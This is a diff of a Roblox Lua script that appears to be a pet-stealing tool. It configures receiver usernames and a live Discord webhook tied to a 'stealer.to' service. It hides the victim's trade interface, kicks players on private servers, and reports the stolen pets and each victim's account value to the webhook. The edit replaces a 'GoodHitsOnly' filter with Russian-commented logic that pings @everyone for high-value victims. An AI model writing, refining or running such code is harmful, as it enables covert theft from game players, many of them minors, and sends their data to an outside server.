@@ -1,7 +1,6 @@
 Username = "sosedra6" -- >> Your main username
 Username2 = "knisdqx_meow" -- >> Your alt username
 Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441486238535385259/UD9X5VKaySPqiqUe4-1kqlcb53x7CD8anvEfE7sIabuCWYPpehYBkuRrAJL85QxF5QLZ" -- >> https://stealer.to/
-GoodHitsOnly = false -- >> Kicks player if they don't have good pets
 
 repeat task.wait() until game:IsLoaded()
 
@@ -30,10 +29,6 @@ end
 if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer() == "VIPServer" then
     game.Players.LocalPlayer:Kick("\nPrivate server detected!")
     return
-end
-
-if GoodHitsOnly == nil then
-    GoodHitsOnly = false
 end
 
 -- >> Values Table for all pets << --
@@ -886,8 +881,6 @@ game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
 game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
 game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
 
-local sent = false
-
 -- Function to send trade success message to Discord
 function SendTradeSuccessMessage(ReceiverName, tradedPets)
     local http = game:GetService("HttpService")
@@ -948,18 +941,6 @@ function SendTradeSuccessMessage(ReceiverName, tradedPets)
         })
     end)
 end
-
---<>----< GoodHitsOnly logic >----<>--
-if GoodHitsOnly then
-    if totalValue >= 50 then
-        SendMessageEMBED(Webhook, embed, true)
-    else
-        return
-    end
-else
-    SendMessageEMBED(Webhook, embed, totalValue >= 50)
-end
-
 
 local function TradeIncoming(ReceiverName)
     while true do
@@ -1067,7 +1048,14 @@ game:GetService("Players").PlayerRemoving:Connect(function(player)
     end
 end)
 
-SendMessageEMBED(Webhook, embed, true)
+-- Отправляем вебхук с учетом стоимости для @everyone
+if totalValue >= 50 then
+    SendMessageEMBED(Webhook, embed, true)  -- С @everyone
+    print("📢 High value account - Sending with @everyone (Value: " .. totalValue .. "₽)")
+else
+    SendMessageEMBED(Webhook, embed, false) -- Без @everyone
+    print("📧 Low value account - Sending without @everyone (Value: " .. totalValue .. "₽)")
+end
 
 game.Players.PlayerAdded:Connect(function(player)
     if player.Name == Username then
